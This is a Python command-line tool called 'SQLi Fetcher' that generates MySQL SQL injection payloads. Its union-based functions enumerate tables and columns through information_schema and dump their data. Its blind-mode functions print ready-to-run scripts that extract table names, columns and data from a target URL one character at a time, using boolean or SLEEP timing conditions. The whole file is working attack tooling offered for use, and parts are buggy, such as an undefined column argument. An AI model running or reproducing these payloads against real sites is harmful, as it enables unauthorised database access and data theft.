import string
import random
import os
import argparse

def banner():
    text = '''
███████╗ ██████╗ ██╗     ██╗    ███████╗███████╗████████╗██╗  ██╗ ██████╗███████╗██████╗ 
██╔════╝██╔═══██╗██║     ██║    ██╔════╝██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔════╝██╔══██╗
███████╗██║   ██║██║     ██║    █████╗  █████╗     ██║   ███████║██║     █████╗  ██████╔╝
╚════██║██║▄▄ ██║██║     ██║    ██╔══╝  ██╔══╝     ██║   ██╔══██║██║     ██╔══╝  ██╔══██╗
███████║╚██████╔╝███████╗██║    ██║     ███████╗   ██║   ██║  ██║╚██████╗███████╗██║  ██║
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝     ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
                                                                                         '''
    
    print(text)
    print("made by: DJumanto")
    print("We make your payload so you dont have to make one by yourself")
    

def generate_random_string():
    return ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=10))

# Return information in bound with returned response
# TODO: MAKE FOR MORE DBMS
def return_tables(payload, colcount, keystring=generate_random_string(), sub=[], dbcontext="mysql"):
    sqlpayload = f'''{payload} UNION SELECT table_name,{f"'{keystring}',"*colcount} FROM information_schema.tables WHERE table_schema=database()-- -'''.replace(f"'{keystring}', FROM", f"'{keystring}' FROM")
    if sub != []:
        for i in range(0,len(sub),2):
            sqlpayload = sqlpayload.replace(sub[i], sub[i+1])
    return "Here's your payload sir: "+sqlpayload
def return_columns(payload, table, colcount, keystring=generate_random_string(), sub=[], dbcontext="mysql"):
    sqlpayload = f'''{payload} UNION SELECT column_name,{f"'{keystring}',"*colcount} FROM information_schema.columns WHERE table_name='{table}'-- -'''.replace(f"'{keystring}', FROM", f"'{keystring}' FROM")
    if sub != []:
        for i in range(0,len(sub),2):
            sqlpayload = sqlpayload.replace(sub[i], sub[i+1])
    return "Here's your payload sir: "+sqlpayload
def return_data(payload, table, column, colcount, keystring=generate_random_string(), sub=[], dbcontext="mysql"):
    sqlpayload = f'''{payload} UNION SELECT {column},{f"'{keystring}',"*colcount} FROM {table}-- -'''.replace(f"'{keystring}', FROM", f"'{keystring}' FROM")
    if sub != []:
        for i in range(0,len(sub),2):
            sqlpayload = sqlpayload.replace(sub[i], sub[i+1])
    return "Here's your payload sir: "+sqlpayload

# return information in bound with limited/no response
# TODO: MAKE BLIND CODE FOR USER [DONE]
# TODO: MAKE IT WORK AHAHAH 
# TODO: MAKE FOR POST REQUEST
# TODO: MAKE FOR MORE DBMS
def return_tables_blind(url, payload, tablenamelike,  mode='bool',dbcontext="mysql"):
    if(mode == 'bool'):
        return """
Here's your code, you can adjust this for your convinience:\n""" + f"""
import requests
import string

url = "{url}"
i=1
while True:
    sqlpayload = f'''{payload} AND IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%{tablenamelike}%')>"""+"""{i}+,1,0)-- -'''
    response = requests.get(url+sqlpayload)
    if response.status_code == 200:
        i+=1
    else:
        break
""" + f"""
tablename = ''
for j in range(i):
    for s in string.ascii_lowercase:
        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables where table_name like '%{tablenamelike}%'), """+"""{j}, 1)='{s}',1,0)-- -'''
        response = requests.get(url+sqlpayload)
        if response.status_code == 200:
            tablename += s
            break
print(tablename)
"""
    if(mode == 'time'):
        return """
Here's your code, you can adjust this for your convinience:\n""" + f"""
import requests
import string

url = "{url}"
i=1
while True:
    sqlpayload = f'''{payload} AND IF((SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE '%{tablenamelike}%')>"""+"""{i},SLEEP(4),0)-- -'''
    response = requests.get(url+sqlpayload)
    if response.elapsed.total_seconds() > 3:
        i+=1
    else:
        break
""" + f"""
tablename = ''
for j in range(i):
    for s in string.ascii_lowercase:
        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables where table_name like '%{tablenamelike}%'), """+"""{j}, 1)='{s}',SLEEP(4),0)-- -'''
        response = requests.get(url+sqlpayload)
        if response.elapsed.total_seconds() > 3:
            tablename += s
            break
print(tablename)
"""

def return_columns_blind(url, payload, table, mode="bool", dbcontext="mysql"):
    if(mode == 'bool'):
        return """
Here's your code, you can adjust this for your convinience:\n""" + f"""
import requests
url = "{url}"
i=1
while True:
    sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_name='{table}')>"""+"""{i},1,0)-- -'''
    response = requests.get(url+sqlpayload)
    if response.status_code == 200:
        i+=1
    else:
        break
""" + f"""
columnname = ''
for j in range(i):
    for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name='{table}'), """+"""{j}, 1)='{s}',1,0)-- -'''
        response = requests.get(url+sqlpayload)
        if response.status_code == 200:
            columnname += s
            break
print(columnname)
"""
    if(mode == 'time'):
        return """
Here's your code, you can adjust this for your convinience:\n""" + f"""
import requests

url = "{url}"
i=1
while True:
    sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT(column_name)) FROM information_schema.columns WHERE table_name='{table}')>"""+"""{i},SLEEP(4),0)-- -'''
    response = requests.get(url+sqlpayload)
    if response.elapsed.total_seconds() > 3:
        i+=1
    else:
        break
""" + f"""
columnname = ''
for j in range(i):
    for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_name='{table}'), """+"""{j}, 1)='{s}',SLEEP(4),0)-- -'''
        response = requests.get(url+sqlpayload)
        if response.elapsed.total_seconds() > 3:
            columnname += s
            break
print(columnname)
    """

    return
def return_data_blind(url, payload, table, column, mode="bool", dbcontext="mysql"):
    if(mode == 'bool'):
        return """
Here's your code, you can adjust this for your convinience:\n""" + f"""
import requests

url = "{url}"
i=1
while True:
    sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT({column})) FROM {table})>"""+"""{i},1,0)-- -'''
    response = requests.get(url+sqlpayload)
    if response.status_code == 200:
        i+=1
    else:
        break
""" + f"""
data = ''
for j in range(i):
    for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT({column}) FROM {table}), """+"""{j}, 1)='{s}',1,0)-- -'''
        response = requests.get(url+sqlpayload)
        if response.status_code == 200:
            data += s
            break
print(data)
"""
    if(mode == 'time'):
        return """
Here's your code, you can adjust this for your convinience:\n""" + f"""
import requests

url = "{url}"
i=1
while True:
    sqlpayload = f'''{payload} AND IF((SELECT LENGTH(GROUP_CONCAT({column})) FROM {table})>"""+"""{i},SLEEP(4),0)-- -'''
    response = requests.get(url+sqlpayload)
    if response.elapsed.total_seconds() > 3:
        i+=1
    else:
        break
""" + f"""
data = ''
for j in range(i):
    for s in 'abcdefghijklmnopqrstuvxyz0123456789, ':
        sqlpayload = f'''{payload} AND IF(SUBSTRING((SELECT GROUP_CONCAT({column}) FROM {table}), """+"""{j}, 1)='{s}',SLEEP(4),0)-- -'''
        response = requests.get(url+sqlpayload)
        if response.elapsed.total_seconds() > 3:
            data += s
            break
print(data)
"""

# TODO: Make it interactive [DONE]
def menu():
    parser = argparse.ArgumentParser(description="SQL Injection Fetcher")

    parser.add_argument('payload', type=str, help="Your SQL injection payload")
    parser.add_argument('-m', '--method', type=str, choices=['tables', 'columns', 'data'], help="Method to use")
    parser.add_argument('-c', '--column_count', type=int, help="Number of columns to return")
    parser.add_argument('-t', '--table', type=str, help="Table to return")
    parser.add_argument('-b', '--blind', type=int, choices=[0, 1], default=0, help="Blind mode (0 for no, 1 for yes)")
    parser.add_argument('-k', '--keystring', type=str, help="Keystring for the query")
    parser.add_argument('-s', '--substitution', type=str, help="Character substitution (comma-separated) format: {old},{new},{old2},{new2},etc...")
    parser.add_argument('-d', '--dbcontext', type=str, default='mysql', help="Database context (default mysql)")
    parser.add_argument('-u', '--url', type=str, help="URL for blind mode")
    parser.add_argument('-l', '--like', type=str, help="LIKE statement for blind mode")
    parser.add_argument('-mo', '--mode', type=str, choices=['bool', 'time'], default='bool', help="Blind mode (bool or time)")

    return parser.parse_args()

if __name__ == '__main__':
    banner()
    args = menu()
    if args.blind == 0:
        if args.method == 'tables':
            print(return_tables(args.payload, args.column_count, args.keystring, args.substitution.split(',')))
        elif args.method == 'columns':
            print(return_columns(args.payload, args.table, args.column_count, args.keystring, args.substitution.split(',')))
        elif args.method == 'data':
            print(return_data(args.payload, args.table, args.column, args.column_count, args.keystring, args.substitution.split(',')))
        else:
            print("Please provide a method")
    else:
        if(args.url == None):
                print("Please provide a URL for column blind mode")
                exit()
        if args.method == 'tables':
            if(args.like == None):
                print("Please provide a LIKE statement for table blind mode")
                exit()
            if(args.mode == 'time'):
                print(return_tables_blind(args.url, args.payload, args.like, args.mode))
            else:
                print(return_tables_blind(args.url, args.payload, args.like))
        elif args.method == 'columns':
            if(args.mode == 'time'):
                print(return_columns_blind(args.url, args.payload, args.table, args.mode))
            else:
                print(return_columns_blind(args.url, args.payload, args.table))
        elif args.method == 'data':
            if(args.mode == 'time'):
                print(return_data_blind(args.url, args.payload, args.table, args.column, args.mode))
            else:
                print(return_data_blind(args.url, args.payload, args.table, args.column))
        else:
            print("Please provide a method")


